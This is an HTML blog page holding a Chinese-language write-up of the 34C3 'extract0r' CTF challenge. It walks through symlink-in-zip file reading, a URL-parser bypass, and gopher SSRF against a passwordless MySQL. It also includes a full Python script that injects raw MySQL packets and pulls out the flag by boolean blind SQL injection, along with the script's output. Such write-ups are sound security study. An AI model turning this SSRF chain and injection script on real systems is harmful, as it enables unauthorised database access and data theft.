@@ -1,0 +1,112 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=Content-Language content="en"><meta name=color-scheme content="light dark"><meta name=author content="James"><meta name=description content="每个月定期补一些老题目，记录一下。这题算是老题新做吧，最后一步自己的小思路貌似在网上没有找到一样的，嘿嘿。
+第一步，上传symlink，列目录读文件
+题目通过url下载一个zip文件，然后解压到指定目录。通过上传一个打包了symlink文件的zip，解压后就可以用这个symlink遍历目录，实现任意文件读。
+在/home/extract0r目录下发现flag位置，在mysql数据库里，并且发现数据库的m4st3r_ov3rl0rd用户有读flag表的权限，此用户没有设置密码 在/var/www/html目录下读到源码 知识点：linux下的symlink文件可以打包到zip里，解压后可以通过symlink文件进行目录遍历
+障碍点：这里想着直接通过读取mysql数据库文件的方式拿flag，发现目录遍历没有遍历出mysql所在的目录。然后自己本地起一个mysql服务发现，mysql的目录默认对于非mysql用户和组的用户没有可读权限，想想这也是合理的。
+第二步，通过源码得知题目用php自带的curl函数发起请求，底层调用libcurl的函数，libcurl这个库存在很多冗余写法，很容易绕过php的parse_url的过滤。这一步就考虑利用curl的gopher协议进行ssrf，其中绕过的payload如下
+http://foo@[cafebeef.cf]:foo@github.com:3306/ 知识点：libcurl非常宽松，有很多公开的和未公开的绕过姿势。
+第三步， 内网只有本地一个mysql，只能考虑mysql的无交互ssrf。
+原本的印象是mysql这种需要交互的协议无法ssrf，这题考点就是无密码的mysql也是可以ssrf的。
+于是本地拉起一个mysql，设置一个无密码用户和flag表，进行一次查询flag的sql语句，用wireshark把包dump下来。
+tips: mysql客户端指定ssl-mode可以强制mysql不使用tls通信
+echo 'select flag from flag.flag;' | mysql -h 127.0.0.1 --ssl-mode=DISABLED -um4st3r_ov3rl0rd wireshark打开如下
+发现客户端发了4个包
+第1次发送登录请求，服务端返回Response OK 由于需要登录的用户不需要密码，第2个包就直接发送sql指令过去了，没有challenge的过程 把这个payload构造一下然后利用ssrf发送给mysql就可以执行任意sql语句了。
+看到github上一种解法是在sql语句的返回中构造一个合法的zip把flag的内容包含到一个文件中，然后借助题目的解包功能拿到flag，或者是时间盲注。但我觉得这两种都比较耗费时间。注意题目在判断curl返回后有很多逻辑，看了一下是可以根据这个逻辑进行盲注的。我们可以在sql的返回中插入一个zip文件流，这里可以插入一个空的zip文件
+root@be498edb0379:/# xxd 1.zip 00000000: 504b 0506 0000 0000 0000 0000 0000 0000 PK.............. 00000010: 0000 0000 0000 ...... root@be498edb0379:/# 这样根据代码逻辑，检测到zip，就正常返回，没有检测到zip，就输出Archive's size 0 not supported，这样就可以进行逻辑盲注。下面的图片有错误，一个空的zip文件的完整十六进制表示是504b0506000000000000000000000000000000000000
+# payload #!/usr/bin/env python # -*- coding=utf-8 -*- import binascii from urllib.parse import quote_plus import requests def build_payload(sql): auth_p = &#34;ad00000185a2bf01000000010800000000000000000000000000000000000000000000006d34737433725f6f7633726c30726400006d7973716c5f6e61746976655f70617373776f72640065035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404333630370f5f636c69656e745f76657273696f6e06352e372e3235095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c&#34; sql_p = &#34;{}00000003{}&#34; close_p = &#34;0100000001&#34; l = hex(len(sql) + 1)[2:] sql = binascii."><meta name=keywords content="blog,security research,vps"><meta name=twitter:card content="summary"><meta name=twitter:title content="[补番]34c3 extrac0tr writeup"><meta name=twitter:description content="每个月定期补一些老题目，记录一下。这题算是老题新做吧，最后一步自己的小思路貌似在网上没有找到一样的，嘿嘿。
+第一步，上传symlink，列目录读文件
+题目通过url下载一个zip文件，然后解压到指定目录。通过上传一个打包了symlink文件的zip，解压后就可以用这个symlink遍历目录，实现任意文件读。
+在/home/extract0r目录下发现flag位置，在mysql数据库里，并且发现数据库的m4st3r_ov3rl0rd用户有读flag表的权限，此用户没有设置密码 在/var/www/html目录下读到源码 知识点：linux下的symlink文件可以打包到zip里，解压后可以通过symlink文件进行目录遍历
+障碍点：这里想着直接通过读取mysql数据库文件的方式拿flag，发现目录遍历没有遍历出mysql所在的目录。然后自己本地起一个mysql服务发现，mysql的目录默认对于非mysql用户和组的用户没有可读权限，想想这也是合理的。
+第二步，通过源码得知题目用php自带的curl函数发起请求，底层调用libcurl的函数，libcurl这个库存在很多冗余写法，很容易绕过php的parse_url的过滤。这一步就考虑利用curl的gopher协议进行ssrf，其中绕过的payload如下
+http://foo@[cafebeef.cf]:foo@github.com:3306/ 知识点：libcurl非常宽松，有很多公开的和未公开的绕过姿势。
+第三步， 内网只有本地一个mysql，只能考虑mysql的无交互ssrf。
+原本的印象是mysql这种需要交互的协议无法ssrf，这题考点就是无密码的mysql也是可以ssrf的。
+于是本地拉起一个mysql，设置一个无密码用户和flag表，进行一次查询flag的sql语句，用wireshark把包dump下来。
+tips: mysql客户端指定ssl-mode可以强制mysql不使用tls通信
+echo 'select flag from flag.flag;' | mysql -h 127.0.0.1 --ssl-mode=DISABLED -um4st3r_ov3rl0rd wireshark打开如下
+发现客户端发了4个包
+第1次发送登录请求，服务端返回Response OK 由于需要登录的用户不需要密码，第2个包就直接发送sql指令过去了，没有challenge的过程 把这个payload构造一下然后利用ssrf发送给mysql就可以执行任意sql语句了。
+看到github上一种解法是在sql语句的返回中构造一个合法的zip把flag的内容包含到一个文件中，然后借助题目的解包功能拿到flag，或者是时间盲注。但我觉得这两种都比较耗费时间。注意题目在判断curl返回后有很多逻辑，看了一下是可以根据这个逻辑进行盲注的。我们可以在sql的返回中插入一个zip文件流，这里可以插入一个空的zip文件
+root@be498edb0379:/# xxd 1.zip 00000000: 504b 0506 0000 0000 0000 0000 0000 0000 PK.............. 00000010: 0000 0000 0000 ...... root@be498edb0379:/# 这样根据代码逻辑，检测到zip，就正常返回，没有检测到zip，就输出Archive's size 0 not supported，这样就可以进行逻辑盲注。下面的图片有错误，一个空的zip文件的完整十六进制表示是504b0506000000000000000000000000000000000000
+# payload #!/usr/bin/env python # -*- coding=utf-8 -*- import binascii from urllib.parse import quote_plus import requests def build_payload(sql): auth_p = &#34;ad00000185a2bf01000000010800000000000000000000000000000000000000000000006d34737433725f6f7633726c30726400006d7973716c5f6e61746976655f70617373776f72640065035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404333630370f5f636c69656e745f76657273696f6e06352e372e3235095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c&#34; sql_p = &#34;{}00000003{}&#34; close_p = &#34;0100000001&#34; l = hex(len(sql) + 1)[2:] sql = binascii."><meta property="og:title" content="[补番]34c3 extrac0tr writeup"><meta property="og:description" content="每个月定期补一些老题目，记录一下。这题算是老题新做吧，最后一步自己的小思路貌似在网上没有找到一样的，嘿嘿。
+第一步，上传symlink，列目录读文件
+题目通过url下载一个zip文件，然后解压到指定目录。通过上传一个打包了symlink文件的zip，解压后就可以用这个symlink遍历目录，实现任意文件读。
+在/home/extract0r目录下发现flag位置，在mysql数据库里，并且发现数据库的m4st3r_ov3rl0rd用户有读flag表的权限，此用户没有设置密码 在/var/www/html目录下读到源码 知识点：linux下的symlink文件可以打包到zip里，解压后可以通过symlink文件进行目录遍历
+障碍点：这里想着直接通过读取mysql数据库文件的方式拿flag，发现目录遍历没有遍历出mysql所在的目录。然后自己本地起一个mysql服务发现，mysql的目录默认对于非mysql用户和组的用户没有可读权限，想想这也是合理的。
+第二步，通过源码得知题目用php自带的curl函数发起请求，底层调用libcurl的函数，libcurl这个库存在很多冗余写法，很容易绕过php的parse_url的过滤。这一步就考虑利用curl的gopher协议进行ssrf，其中绕过的payload如下
+http://foo@[cafebeef.cf]:foo@github.com:3306/ 知识点：libcurl非常宽松，有很多公开的和未公开的绕过姿势。
+第三步， 内网只有本地一个mysql，只能考虑mysql的无交互ssrf。
+原本的印象是mysql这种需要交互的协议无法ssrf，这题考点就是无密码的mysql也是可以ssrf的。
+于是本地拉起一个mysql，设置一个无密码用户和flag表，进行一次查询flag的sql语句，用wireshark把包dump下来。
+tips: mysql客户端指定ssl-mode可以强制mysql不使用tls通信
+echo 'select flag from flag.flag;' | mysql -h 127.0.0.1 --ssl-mode=DISABLED -um4st3r_ov3rl0rd wireshark打开如下
+发现客户端发了4个包
+第1次发送登录请求，服务端返回Response OK 由于需要登录的用户不需要密码，第2个包就直接发送sql指令过去了，没有challenge的过程 把这个payload构造一下然后利用ssrf发送给mysql就可以执行任意sql语句了。
+看到github上一种解法是在sql语句的返回中构造一个合法的zip把flag的内容包含到一个文件中，然后借助题目的解包功能拿到flag，或者是时间盲注。但我觉得这两种都比较耗费时间。注意题目在判断curl返回后有很多逻辑，看了一下是可以根据这个逻辑进行盲注的。我们可以在sql的返回中插入一个zip文件流，这里可以插入一个空的zip文件
+root@be498edb0379:/# xxd 1.zip 00000000: 504b 0506 0000 0000 0000 0000 0000 0000 PK.............. 00000010: 0000 0000 0000 ...... root@be498edb0379:/# 这样根据代码逻辑，检测到zip，就正常返回，没有检测到zip，就输出Archive's size 0 not supported，这样就可以进行逻辑盲注。下面的图片有错误，一个空的zip文件的完整十六进制表示是504b0506000000000000000000000000000000000000
+# payload #!/usr/bin/env python # -*- coding=utf-8 -*- import binascii from urllib.parse import quote_plus import requests def build_payload(sql): auth_p = &#34;ad00000185a2bf01000000010800000000000000000000000000000000000000000000006d34737433725f6f7633726c30726400006d7973716c5f6e61746976655f70617373776f72640065035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404333630370f5f636c69656e745f76657273696f6e06352e372e3235095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c&#34; sql_p = &#34;{}00000003{}&#34; close_p = &#34;0100000001&#34; l = hex(len(sql) + 1)[2:] sql = binascii."><meta property="og:type" content="article"><meta property="og:url" content="https://blog.123577.xyz/posts/34c3-extract0r/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-09-27T15:38:53+08:00"><meta property="article:modified_time" content="2022-09-27T15:38:53+08:00"><title>[补番]34c3 extrac0tr writeup · james' blog
+</title><link rel=canonical href=https://blog.123577.xyz/posts/34c3-extract0r/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.93c41bf1e522f85ecda7355985f09000f71fc1d64dda9f74051b0fa06210e93f.css integrity="sha256-k8Qb8eUi+F7NpzVZhfCQAPcfwdZN2p90BRsPoGIQ6T8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-light"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>james' blog
+</a><input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/posts/>Blog</a></li><li class=navigation-item><a class=navigation-link href=/about/>About</a></li><li class=navigation-item><a class=navigation-link href=/link/>Friends</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://blog.123577.xyz/posts/34c3-extract0r/>[补番]34c3 extrac0tr writeup</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
+<time datetime=2022-09-27T15:38:53+08:00>September 27, 2022
+</time></span><span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
+One-minute read</span></div></div></header><div><p>每个月定期补一些老题目，记录一下。这题算是老题新做吧，最后一步自己的小思路貌似在网上没有找到一样的，嘿嘿。</p><p>第一步，上传symlink，列目录读文件</p><p>题目通过url下载一个zip文件，然后解压到指定目录。通过上传一个打包了symlink文件的zip，解压后就可以用这个symlink遍历目录，实现任意文件读。</p><ul><li>在/home/extract0r目录下发现flag位置，在mysql数据库里，并且发现数据库的<code>m4st3r_ov3rl0rd</code>用户有读flag表的权限，此用户没有设置密码</li><li>在/var/www/html目录下读到源码</li></ul><blockquote><p>知识点：linux下的symlink文件可以打包到zip里，解压后可以通过symlink文件进行目录遍历</p></blockquote><blockquote><p>障碍点：这里想着直接通过读取mysql数据库文件的方式拿flag，发现目录遍历没有遍历出mysql所在的目录。然后自己本地起一个mysql服务发现，mysql的目录默认对于非mysql用户和组的用户没有可读权限，想想这也是合理的。</p></blockquote><p>第二步，通过源码得知题目用php自带的curl函数发起请求，底层调用libcurl的函数，libcurl这个库存在很多冗余写法，很容易绕过php的parse_url的过滤。这一步就考虑利用curl的gopher协议进行ssrf，其中绕过的payload如下</p><pre tabindex=0><code>http://foo@[cafebeef.cf]:foo@github.com:3306/
+</code></pre><blockquote><p>知识点：libcurl非常宽松，有很多公开的和未公开的绕过姿势。</p></blockquote><p>第三步， 内网只有本地一个mysql，只能考虑mysql的无交互ssrf。</p><p>原本的印象是mysql这种需要交互的协议无法ssrf，这题考点就是无密码的mysql也是可以ssrf的。</p><p>于是本地拉起一个mysql，设置一个无密码用户和flag表，进行一次查询flag的sql语句，用wireshark把包dump下来。</p><p>tips: mysql客户端指定ssl-mode可以强制mysql不使用tls通信</p><pre tabindex=0><code>echo &#39;select flag from flag.flag;&#39; | mysql -h 127.0.0.1 --ssl-mode=DISABLED -um4st3r_ov3rl0rd
+</code></pre><p>wireshark打开如下</p><p><img src=../../images/image-20210922143329642.png alt=image-20210922143329642></p><p>发现客户端发了4个包</p><ul><li>第1次发送登录请求，服务端返回Response OK</li><li>由于需要登录的用户不需要密码，第2个包就直接发送sql指令过去了，没有challenge的过程</li></ul><p><img src=../../images/image-20210922144430059.png alt=image-20210922144430059></p><p>把这个payload构造一下然后利用ssrf发送给mysql就可以执行任意sql语句了。</p><p><img src=../../images/image-20210922150212267.png alt=image-20210922150212267></p><p>看到github上一种解法是在sql语句的返回中构造一个合法的zip把flag的内容包含到一个文件中，然后借助题目的解包功能拿到flag，或者是时间盲注。但我觉得这两种都比较耗费时间。注意题目在判断curl返回后有很多逻辑，看了一下是可以根据这个逻辑进行盲注的。我们可以在sql的返回中插入一个zip文件流，这里可以插入一个空的zip文件</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@be498edb0379:/# xxd 1.zip
+</span></span><span style=display:flex><span>00000000: 504b <span style=color:#ae81ff>0506</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span>  PK..............
+</span></span><span style=display:flex><span>00000010: <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span>                           ......
+</span></span><span style=display:flex><span>root@be498edb0379:/#
+</span></span></code></pre></div><p>这样根据代码逻辑，检测到zip，就正常返回，没有检测到zip，就输出<code>Archive's size 0 not supported</code>，这样就可以进行逻辑盲注。下面的图片有错误，一个空的zip文件的完整十六进制表示是<code>504b0506000000000000000000000000000000000000</code></p><p><img src=../../images/image-20210922153017772.png alt=image-20210922153017772></p><h2 id=-payload># payload
+<a class=heading-link href=#-payload><i class="fa fa-link" aria-hidden=true></i></a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding=utf-8 -*-</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> binascii
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> urllib.parse <span style=color:#f92672>import</span> quote_plus
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>build_payload</span>(sql):
+</span></span><span style=display:flex><span>    auth_p <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ad00000185a2bf01000000010800000000000000000000000000000000000000000000006d34737433725f6f7633726c30726400006d7973716c5f6e61746976655f70617373776f72640065035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404333630370f5f636c69656e745f76657273696f6e06352e372e3235095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c&#34;</span>
+</span></span><span style=display:flex><span>    sql_p <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>00000003</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>    close_p <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0100000001&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    l <span style=color:#f92672>=</span> hex(len(sql) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)[<span style=color:#ae81ff>2</span>:]
+</span></span><span style=display:flex><span>    sql <span style=color:#f92672>=</span> binascii<span style=color:#f92672>.</span>hexlify(sql<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>decode()
+</span></span><span style=display:flex><span>    sql_s <span style=color:#f92672>=</span> sql_p<span style=color:#f92672>.</span>format(l, sql) <span style=color:#75715e># wired bug</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> auth_p <span style=color:#f92672>+</span> sql_s <span style=color:#f92672>+</span> close_p
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(payload)
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> quote_plus(payload)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;+&#34;</span>, <span style=color:#e6db74>&#34;%20&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://127.0.0.1:1342?url=&#34;</span>
+</span></span><span style=display:flex><span>    cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;gopher://a@[cafebeef.cf]@google.com:3306/_&#34;</span> <span style=color:#f92672>+</span> payload
+</span></span><span style=display:flex><span>    cmd <span style=color:#f92672>=</span> quote_plus(cmd)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> host <span style=color:#f92672>+</span> cmd
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> k <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>33</span>):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>32</span>, <span style=color:#ae81ff>127</span>):
+</span></span><span style=display:flex><span>            sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;select if((select ascii(substr((select flag from flag.flag),</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>,1)))=</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>,unhex(&#34;504b0506000000000000000000000000000000000000&#34;),2333)&#39;</span><span style=color:#f92672>.</span>format(k, i)
+</span></span><span style=display:flex><span>            p <span style=color:#f92672>=</span> build_payload(sql)
+</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(p)
+</span></span><span style=display:flex><span>            <span style=color:#75715e># print(r.text)</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;Done&#39;</span> <span style=color:#f92672>in</span> r<span style=color:#f92672>.</span>text:
+</span></span><span style=display:flex><span>                flag <span style=color:#f92672>+=</span> chr(i)
+</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>&#34;[*] flag=&#34;</span> <span style=color:#f92672>+</span> flag)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>main()
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> flag<span style=color:#f92672>=</span>34C3_you_E1tr4cte6_t<span style=color:#f92672>[</span>e_unExtract0ble_plUsDyou_knoW_s0me_
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> flag<span style=color:#f92672>=</span>34C3_you_E1tr4cte6_t<span style=color:#f92672>[</span>e_unExtract0ble_plUsDyou_knoW_s0me_S
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> flag<span style=color:#f92672>=</span>34C3_you_E1tr4cte6_t<span style=color:#f92672>[</span>e_unExtract0ble_plUsDyou_knoW_s0me_SS
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> flag<span style=color:#f92672>=</span>34C3_you_E1tr4cte6_t<span style=color:#f92672>[</span>e_unExtract0ble_plUsDyou_knoW_s0me_SSR
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> flag<span style=color:#f92672>=</span>34C3_you_E1tr4cte6_t<span style=color:#f92672>[</span>e_unExtract0ble_plUsDyou_knoW_s0me_SSRF
+</span></span></code></pre></div><blockquote><p>知识点：zip协议扫描是从zip尾签名开始的，7z的实现遵循了zip协议，所以mysql协议开头的字符不影响zip文件的读取和解压。</p></blockquote><blockquote><p>障碍点：需要交互的服务无法ssrf的意思，本质是ssrf无法动态的构造服务交互所需要的数据包，而如果这种数据包是我们已知的，那么ssrf也可以对需要交互的服务进行攻击。</p></blockquote></div><footer></footer></article></section></div><footer class=footer><section class=container>©
+2022 -
+2023
+James
+·
+Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.978ac2219b08e24e68c3f3eada8d99add50d9d997ce3861354b602cc94f75f30.js integrity="sha256-l4rCIZsI4k5ow/Pq2o2ZrdUNnZl844YTVLYCzJT3XzA="></script></body></html>
